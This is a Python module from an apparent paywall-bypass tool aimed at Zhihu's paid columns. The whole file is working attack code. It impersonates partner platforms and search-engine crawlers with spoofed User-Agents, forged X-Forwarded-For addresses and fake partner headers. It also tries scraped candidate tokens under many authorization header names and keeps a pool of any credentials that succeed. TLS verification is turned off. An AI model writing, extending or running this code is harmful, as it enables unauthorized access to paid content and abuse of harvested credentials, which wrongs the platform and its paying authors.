# -*- coding: utf-8 -*-
"""
ZCCSA 第三方平台Token提取引擎（Zero-Cookie高成功率引擎）
- 维护已知的第三方平台配置（微信读书、百度、头条、搜狗、Googlebot等）
- 使用平台级UA + 信任头 + 已知Token端点并发探测
- Token池复用：成功提取的Token缓存供后续请求使用
- 权重：90（核心高优先级引擎）
"""
import asyncio
import json
import logging
import random
import re
from typing import Any, Dict, List, Optional

import httpx

from engines.base_engine import BaseEngine, EngineResult

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
import config

logger = logging.getLogger(__name__)


class ThirdPartyTokenEngine(BaseEngine):
    """
    第三方平台Token提取引擎
    原理：知乎与微信读书/百度/头条/搜狗等平台有内容同步协议，使用平台级API Key拉取内容。
    如果API网关对来源IP或平台Token校验不严，可直接复用这些平台级凭证获取完整内容。
    """

    name = "third_party_token_engine"
    description = "第三方平台Token提取（高优先级Zero-Cookie引擎）"
    default_weight = 90

    # 已知第三方平台Profile（UA + 信任头 + API端点模板）
    PARTNER_PROFILES = {
        "weread": {
            "name": "微信读书",
            "user_agent": "WeRead/6.0.4 (iPhone; iOS 16.0; Scale/3.00) "
                          "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
            "trust_headers": {
                "X-Platform-Source": "weread",
                "X-Partner-Id": "weread",
                "X-Distribution-Channel": "weread",
                "X-Weread-Client": "weread-ios",
                "Referer": "https://weread.qq.com/",
                "Origin": "https://weread.qq.com",
            },
            "api_endpoints": [
                "https://api.zhihu.com/v4/content/{article_id}?platform=weread",
                "https://api.zhihu.com/v4/market/sections/{article_id}?include=content",
                "https://www.zhihu.com/api/v4/market/partner/weread/sections/{article_id}",
                "https://www.zhihu.com/api/v4/market/partner/weread/content/{article_id}",
                "https://api.zhihu.com/v4/market/partner/weread/articles/{article_id}",
            ],
            "static_tokens": [],
        },
        "baidu": {
            "name": "百度搜索/百度小程序",
            "user_agent": "Mozilla/5.0 (compatible; Baiduspider-render/2.0; "
                          "+http://www.baidu.com/search/spider.html)",
            "trust_headers": {
                "X-Partner-Id": "baidu",
                "X-Forwarded-For": "220.181.108.{}",
                "X-From-Baidu": "1",
                "X-Baidu-App": "1",
                "Referer": "https://www.baidu.com/",
            },
            "api_endpoints": [
                "https://www.zhihu.com/api/v4/articles/{article_id}?include=content",
                "https://www.zhihu.com/api/v4/market/sections/{article_id}?include=content",
                "https://www.zhihu.com/api/v4/market/partner/baidu/sections/{article_id}",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "baidu_spider": {
            "name": "百度爬虫",
            "user_agent": "Mozilla/5.0 (compatible; Baiduspider/2.0; "
                          "+http://www.baidu.com/search/spider.html)",
            "trust_headers": {
                "X-Forwarded-For": "123.125.71.{}",
                "Accept": "text/html,application/xhtml+xml",
            },
            "api_endpoints": [
                "https://www.zhihu.com/market/paid_column/{column_id}/section/{article_id}",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "googlebot": {
            "name": "Googlebot爬虫",
            "user_agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "trust_headers": {
                "X-Forwarded-For": "66.249.{}",
                "Accept": "text/html,application/xhtml+xml",
            },
            "api_endpoints": [
                "https://www.zhihu.com/api/v4/articles/{article_id}?include=content",
                "https://www.zhihu.com/market/paid_column/{column_id}/section/{article_id}",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "bingbot": {
            "name": "Bingbot爬虫",
            "user_agent": "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "trust_headers": {
                "X-Forwarded-For": "207.46.{}",
                "Accept": "text/html,application/xhtml+xml",
            },
            "api_endpoints": [
                "https://www.zhihu.com/market/paid_column/{column_id}/section/{article_id}",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "sogou": {
            "name": "搜狗搜索（微信/知乎搜索）",
            "user_agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)",
            "trust_headers": {
                "X-Partner-Id": "sogou",
                "X-Crawler": "sogou",
                "Referer": "https://weixin.sogou.com/",
            },
            "api_endpoints": [
                "https://www.zhihu.com/api/v4/market/partner/sogou/sections/{article_id}",
                "https://www.zhihu.com/api/v4/articles/{article_id}?include=content",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "toutiao": {
            "name": "今日头条/字节跳动",
            "user_agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 "
                          "NewsArticle/8.10.0",
            "trust_headers": {
                "X-Partner-Id": "toutiao",
                "X-Channel": "toutiao",
                "X-Platform-Source": "toutiao",
                "Referer": "https://www.toutiao.com/",
            },
            "api_endpoints": [
                "https://www.zhihu.com/api/v4/market/partner/toutiao/sections/{article_id}",
                "https://www.zhihu.com/api/v4/market/distribution/{article_id}",
                "https://api.zhihu.com/v4/content/{article_id}?platform=toutiao",
            ],
            "static_tokens": [],
        },
        "shenma": {
            "name": "神马搜索（UC/阿里）",
            "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
                          "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 "
                          "Mobile/15E148 Safari/604.1 ShenmaSearch/2.0",
            "trust_headers": {
                "X-Partner-Id": "shenma",
                "X-Crawler": "shenma",
                "Referer": "https://m.sm.cn/",
            },
            "api_endpoints": [
                "https://www.zhihu.com/api/v4/articles/{article_id}?include=content",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "360spider": {
            "name": "360搜索爬虫",
            "user_agent": "Mozilla/5.0 (compatible; 360Spider/2.0; +http://www.so.com/help/help_3_2.html)",
            "trust_headers": {
                "X-Forwarded-For": "180.153.{}",
                "Accept": "text/html",
            },
            "api_endpoints": [
                "https://www.zhihu.com/market/paid_column/{column_id}/section/{article_id}",
                "https://zhuanlan.zhihu.com/p/{article_id}",
            ],
            "static_tokens": [],
        },
        "app_ios_internal": {
            "name": "知乎App iOS内部API（无签名版本）",
            "user_agent": "ZhihuHybrid-iOS/8.10.0 (com.zhihu.ios; build:2400; iOS 16.0.0) "
                          "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
                          "AppleWebKit/605.1.15 Mobile/15E148",
            "trust_headers": {
                "X-App-Version": "8.10.0",
                "X-App-Build": "2400",
                "X-Platform": "ios",
                "X-Api-Version": "3.0.40",
                "Accept": "*/*",
            },
            "api_endpoints": [
                "https://api.zhihu.com/market/sections/{article_id}?include=content",
                "https://api.zhihu.com/articles/{article_id}?include=content",
                "https://api.zhihu.com/v4/market/sections/{article_id}?include=content",
                "https://appcloud.zhihu.com/v4/market/sections/{article_id}?include=content",
            ],
            "static_tokens": [],
        },
    }

    # 全局Token池（跨实例复用成功提取的Token）
    _token_pool: Dict[str, Dict[str, Any]] = {}

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._async_client: Optional[httpx.AsyncClient] = None
        self._bypasses_found: List[Dict] = []
        self._baseline_cn = 0

    async def _probe(self, url: str, article_id: Dict,
                     result: EngineResult) -> EngineResult:
        parser = self._get_parser()
        id_info = article_id if article_id else {}
        if id_info.get("type") == "unknown" or not id_info.get("id"):
            id_info = parser.extract_article_id(url)

        art_id = id_info.get("id")
        col_id = id_info.get("column_id")
        art_type = id_info.get("type", "unknown")

        if not art_id:
            result.error = "无法提取文章ID"
            return result

        self.logger.info(f"  文章类型: {art_type}, id={art_id}, column={col_id}")

        # 1. 获取基线响应（标准UA，无任何特殊头）
        baseline = await self._request(url, dict(config.DEFAULT_HEADERS_DESKTOP))
        self._baseline_cn = self._count_cn(baseline.get("text", "")) if baseline else 0
        self.logger.info(f"  基线响应中文字数: {self._baseline_cn}")

        # 2. 优先使用Token池中已发现的有效Token
        best_content = None
        if self._token_pool:
            self.logger.info(f"  [Token池] 发现 {len(self._token_pool)} 个缓存Token，优先尝试...")
            for token_key, token_info in list(self._token_pool.items()):
                cached = await self._try_token(art_id, col_id, url, token_info, parser)
                if cached and self._is_significant_content(cached):
                    if best_content is None or cached.word_count_cn > best_content.word_count_cn:
                        best_content = cached
                    if cached.word_count_cn >= config.COMPLETE_CONTENT_LENGTH:
                        break

        # 2.5 使用token_harvester搜集到的候选Token
        harvested_tokens = self._load_harvested_tokens()
        if harvested_tokens and not (best_content and best_content.word_count_cn >= config.COMPLETE_CONTENT_LENGTH):
            self.logger.info(f"  [Harvested] 加载 {len(harvested_tokens)} 个搜集到的候选Token，测试...")
            harvested_content = await self._probe_harvested_tokens(
                harvested_tokens, art_id, col_id, url, parser
            )
            for hc in harvested_content:
                if self._is_significant_content(hc["content"]):
                    if best_content is None or hc["content"].word_count_cn > best_content.word_count_cn:
                        best_content = hc["content"]
                    self._bypasses_found.append(hc["bypass_info"])
                    # 加入Token池
                    self._token_pool[hc["token_key"]] = hc["token_info"]
                    if best_content and best_content.word_count_cn >= config.COMPLETE_CONTENT_LENGTH:
                        break

        # 3. 并发探测所有平台Profile
        self.logger.info(f"  并发探测 {len(self.PARTNER_PROFILES)} 个第三方平台Profile...")
        tasks = []
        sem = asyncio.Semaphore(5)  # 控制并发数

        async def probe_profile(p_key: str, profile: Dict):
            async with sem:
                return await self._probe_profile(p_key, profile, art_id, col_id, url, parser)

        for p_key, profile in self.PARTNER_PROFILES.items():
            tasks.append(probe_profile(p_key, profile))

        profile_results = await asyncio.gather(*tasks, return_exceptions=True)

        for pr in profile_results:
            if isinstance(pr, Exception):
                continue
            if pr and pr.get("content"):
                cnt = pr["content"]
                if self._is_significant_content(cnt):
                    if best_content is None or cnt.word_count_cn > best_content.word_count_cn:
                        best_content = cnt
                    self._bypasses_found.append(pr["bypass_info"])
                    # 加入Token池
                    if pr.get("token_key"):
                        self._token_pool[pr["token_key"]] = pr["token_info"]

        # 4. 组装结果
        if best_content:
            result.success = True
            result.content = best_content
            if best_content.word_count_cn >= config.COMPLETE_CONTENT_LENGTH and not best_content.is_truncated:
                result.bypass_found = True
                result.bypass_method = (
                    f"第三方平台Token绕过: {best_content.metadata.get('partner', 'unknown')} "
                    f"({best_content.metadata.get('bypass_method', 'unknown')}) "
                    f"获取 {best_content.word_count_cn} 字完整内容"
                )
            else:
                result.bypass_method = (
                    f"第三方平台部分内容: {best_content.metadata.get('partner', 'unknown')} "
                    f"{best_content.word_count_cn} 字"
                )

        result.details = {
            "baseline_cn_words": self._baseline_cn,
            "profiles_tested": list(self.PARTNER_PROFILES.keys()),
            "token_pool_size": len(self._token_pool),
            "bypasses_found": self._bypasses_found[:15],
        }
        return result

    async def _probe_profile(self, p_key: str, profile: Dict,
                              art_id: str, col_id: Optional[str],
                              url: str, parser) -> Optional[Dict]:
        """探测单个平台Profile"""
        best = None
        best_info = None
        ua = profile["user_agent"]
        trust = dict(profile["trust_headers"])

        # 填充随机IP
        for k, v in list(trust.items()):
            if isinstance(v, str) and v.endswith("{}"):
                trust[k] = v.format(random.randint(1, 254))

        # a) 用平台UA访问原URL
        headers = {"User-Agent": ua, **trust}
        resp = await self._request(url, headers)
        if resp and resp["status"] == 200:
            parsed = parser.parse_html(resp["text"], url=resp.get("url", url),
                                       engine_name=self.name)
            parsed.metadata["partner"] = profile["name"]
            parsed.metadata["bypass_method"] = "platform_ua_html"
            if self._is_significant_content(parsed) and parsed.word_count_cn > self._baseline_cn:
                best = parsed
                best_info = {
                    "partner": profile["name"],
                    "method": "platform_ua_html",
                    "endpoint": url,
                    "cn_words": parsed.word_count_cn,
                }

        # b) 并发请求该平台的所有API端点
        api_tasks = []
        for ep_tmpl in profile.get("api_endpoints", []):
            ep = ep_tmpl.replace("{article_id}", art_id)
            if col_id:
                ep = ep.replace("{column_id}", col_id)
            elif "{column_id}" in ep:
                continue
            if "{" in ep:
                continue
            api_headers = {"User-Agent": ua, "Accept": "application/json, text/plain, */*", **trust}
            api_tasks.append(self._request(ep, api_headers))

        if api_tasks:
            api_responses = await asyncio.gather(*api_tasks, return_exceptions=True)
            for ep_resp in api_responses:
                if isinstance(ep_resp, Exception) or not ep_resp:
                    continue
                if ep_resp["status"] != 200 or len(ep_resp.get("text", "")) < 50:
                    continue
                text = ep_resp["text"]
                parsed = None
                try:
                    data = json.loads(text)
                    parsed = parser.parse_json_api(data, url=ep_resp.get("url", ""),
                                                   engine_name=self.name)
                except (json.JSONDecodeError, Exception):
                    parsed = parser.parse_html(text, url=ep_resp.get("url", ""),
                                               engine_name=self.name)

                if parsed and self._is_significant_content(parsed):
                    if best is None or parsed.word_count_cn > best.word_count_cn:
                        parsed.metadata["partner"] = profile["name"]
                        parsed.metadata["bypass_method"] = "platform_api"
                        best = parsed
                        best_info = {
                            "partner": profile["name"],
                            "method": "platform_api",
                            "endpoint": ep_resp.get("url", "")[:80],
                            "cn_words": parsed.word_count_cn,
                        }

        if best:
            return {
                "content": best,
                "bypass_info": best_info,
                "token_key": f"{p_key}:{best_info['method']}" if best_info else None,
                "token_info": {
                    "partner_key": p_key,
                    "partner_name": profile["name"],
                    "user_agent": ua,
                    "trust_headers": trust,
                    "bypass_method": best_info["method"] if best_info else "",
                },
            }
        return None

    async def _try_token(self, art_id: str, col_id: Optional[str],
                          url: str, token_info: Dict, parser) -> Optional[Any]:
        """使用Token池中缓存的Token"""
        ua = token_info.get("user_agent", "")
        trust = token_info.get("trust_headers", {})
        method = token_info.get("bypass_method", "platform_ua_html")

        if method == "platform_api":
            # Token池中的API token无法直接复用（端点和ID绑定），跳过
            return None

        headers = {"User-Agent": ua, **trust}
        resp = await self._request(url, headers)
        if resp and resp["status"] == 200:
            parsed = parser.parse_html(resp["text"], url=resp.get("url", url),
                                       engine_name=self.name)
            parsed.metadata["partner"] = token_info.get("partner_name", "cached")
            parsed.metadata["bypass_method"] = "cached_token"
            if self._is_significant_content(parsed):
                return parsed
        return None

    def _load_harvested_tokens(self) -> List[Dict]:
        """加载token_harvester搜集到的候选Token"""
        try:
            from engines.token_harvester import TokenHarvester
            return TokenHarvester.load_harvested_tokens()
        except Exception:
            return []

    async def _probe_harvested_tokens(self, harvested: List[Dict],
                                       art_id: str, col_id: Optional[str],
                                       url: str, parser) -> List[Dict]:
        """
        将搜集到的候选Token应用到关键API端点进行验证。
        对每个Token，尝试多种Header位置（Authorization、X-API-Key、X-Partner-Token等）
        和多个核心API端点。
        """
        results = []
        sem = asyncio.Semaphore(4)

        # 核心测试端点（优先使用最可能返回内容的端点）
        test_endpoints = [
            f"https://api.zhihu.com/market/sections/{art_id}?include=content",
            f"https://api.zhihu.com/articles/{art_id}?include=content",
            f"https://www.zhihu.com/api/v4/market/sections/{art_id}?include=content",
        ]
        if col_id:
            test_endpoints.insert(0,
                f"https://www.zhihu.com/api/v4/market/columns/{col_id}/sections/{art_id}?include=content"
            )
            test_endpoints.append(
                f"https://www.zhihu.com/market/paid_column/{col_id}/section/{art_id}"
            )

        # Token Header注入方式
        token_header_variants = [
            # (header_name, prefix)
            ("Authorization", "Bearer "),
            ("X-Partner-Token", ""),
            ("X-API-Key", ""),
            ("X-Api-Key", ""),
            ("X-Token", ""),
            ("X-Auth-Token", ""),
            ("X-Zhihu-Token", ""),
            ("App-Key", ""),
            ("app_key", ""),
            ("token", ""),
        ]

        # 去重Token（同一个Token只测一次）
        seen_tokens = set()
        unique_tokens = []
        for entry in harvested:
            t = entry.get("token", "")
            if t and t not in seen_tokens and len(t) >= 16:
                seen_tokens.add(t)
                unique_tokens.append(entry)

        async def test_single_token(entry: Dict):
            async with sem:
                token = entry["token"]
                source = entry.get("source", "unknown")
                for header_name, prefix in token_header_variants:
                    for ep in test_endpoints[:3]:  # 每个Token只测前3个端点，控制请求数
                        headers = {
                            "User-Agent": config.DEFAULT_HEADERS_DESKTOP.get("User-Agent", ""),
                            "Accept": "application/json, text/plain, */*",
                            header_name: prefix + token,
                            "Referer": "https://www.zhihu.com/",
                        }
                        try:
                            resp = await self._request(ep, headers)
                            if resp and resp["status"] == 200 and len(resp.get("text", "")) > 200:
                                text = resp["text"]
                                parsed = None
                                try:
                                    data = json.loads(text)
                                    parsed = parser.parse_json_api(data, url=resp.get("url", ep),
                                                                   engine_name=self.name)
                                except Exception:
                                    parsed = parser.parse_html(text, url=resp.get("url", ep),
                                                               engine_name=self.name)
                                if parsed and self._is_significant_content(parsed):
                                    parsed.metadata["partner"] = f"harvested_token({source})"
                                    parsed.metadata["bypass_method"] = f"harvested_token:{header_name}"
                                    parsed.metadata["harvested_token_source"] = source
                                    results.append({
                                        "content": parsed,
                                        "bypass_info": {
                                            "partner": f"HarvestedToken({source})",
                                            "method": f"token_in_{header_name}",
                                            "endpoint": ep[:80],
                                            "cn_words": parsed.word_count_cn,
                                        },
                                        "token_key": f"harvested:{token[:8]}:{header_name}",
                                        "token_info": {
                                            "partner_name": f"HarvestedToken({source})",
                                            "user_agent": headers.get("User-Agent", ""),
                                            "trust_headers": {header_name: prefix + token},
                                            "bypass_method": "harvested_token",
                                        },
                                    })
                                    return  # 找到一个有效Token就停止该Token的测试
                        except Exception:
                            continue
                        await asyncio.sleep(0.1)

        # 限制测试的Token数量（避免请求过多），优先测试最近搜集的
        tokens_to_test = unique_tokens[-20:]  # 最多测20个Token
        tasks = [test_single_token(e) for e in tokens_to_test]
        await asyncio.gather(*tasks, return_exceptions=True)
        return results

    async def _request(self, url: str, headers: Dict) -> Optional[Dict]:
        """发起HTTP请求"""
        try:
            client = await self._get_client()
            self._increment_requests()
            resp = await client.get(url, headers=dict(headers), timeout=12,
                                    follow_redirects=True)
            return {
                "status": resp.status_code,
                "text": resp.text,
                "headers": dict(resp.headers),
                "url": str(resp.url),
            }
        except Exception as e:
            self.logger.debug(f"请求失败 {url[:60]}: {str(e)[:60]}")
            return None

    async def _get_client(self) -> httpx.AsyncClient:
        if not self._async_client:
            self._async_client = httpx.AsyncClient(
                follow_redirects=True,
                timeout=config.REQUEST_TIMEOUT,
                verify=False,
            )
        return self._async_client

    @staticmethod
    def _count_cn(text: str) -> int:
        return len(re.findall(r'[\u4e00-\u9fff]', text))
